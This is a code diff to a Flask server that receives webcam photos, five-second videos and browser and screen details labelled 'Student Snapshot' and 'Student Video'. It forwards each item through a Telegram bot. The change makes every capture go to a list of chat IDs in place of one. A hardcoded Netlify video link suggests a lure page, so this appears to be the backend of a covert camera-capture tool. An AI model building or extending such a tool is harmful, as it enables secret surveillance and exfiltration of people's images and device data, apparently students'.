@@ -5,7 +5,10 @@ from flask import Flask, send_file, request, jsonify
 app = Flask(__name__)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
+
+# 🔥 change only this line
+CHAT_IDS = os.environ.get("CHAT_IDS", "").split(",")
+
 RENDER_URL = os.environ.get("RENDER_URL")
 current_video_url = "https://app0707.netlify.app/ "
 
@@ -30,16 +33,18 @@ def upload():
         temp = "temp.jpg"
         photo.save(temp)
 
-        with open(temp, "rb") as f:
+        for CHAT_ID in CHAT_IDS:   # 🔥 bas loop add kiya
+            CHAT_ID = CHAT_ID.strip()
 
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                files={"photo": f},
-                data={
-                    "chat_id": CHAT_ID,
-                    "caption": "📸 Student Snapshot"
-                }
-            )
+            with open(temp, "rb") as f:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                    files={"photo": f},
+                    data={
+                        "chat_id": CHAT_ID,
+                        "caption": "📸 Student Snapshot"
+                    }
+                )
 
         os.remove(temp)
 
@@ -56,16 +61,18 @@ def video():
         temp = "temp.webm"
         video.save(temp)
 
-        with open(temp, "rb") as f:
+        for CHAT_ID in CHAT_IDS:
+            CHAT_ID = CHAT_ID.strip()
 
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                files={"video": f},
-                data={
-                    "chat_id": CHAT_ID,
-                    "caption": "🎥 Student Video (5 sec)"
-                }
-            )
+            with open(temp, "rb") as f:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
+                    files={"video": f},
+                    data={
+                        "chat_id": CHAT_ID,
+                        "caption": "🎥 Student Video (5 sec)"
+                    }
+                )
 
         os.remove(temp)
 
@@ -87,10 +94,13 @@ Browser : {data.get("browser")}
 Screen : {data.get("screen")}
 """
 
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        json={"chat_id": CHAT_ID, "text": text}
-    )
+    for CHAT_ID in CHAT_IDS:
+        CHAT_ID = CHAT_ID.strip()
+
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text}
+        )
 
     return "OK"
 
@@ -100,4 +110,4 @@ if __name__ == "__main__":
     app.run(
         host="0.0.0.0",
         port=int(os.environ.get("PORT", 8080))
-)
+                )
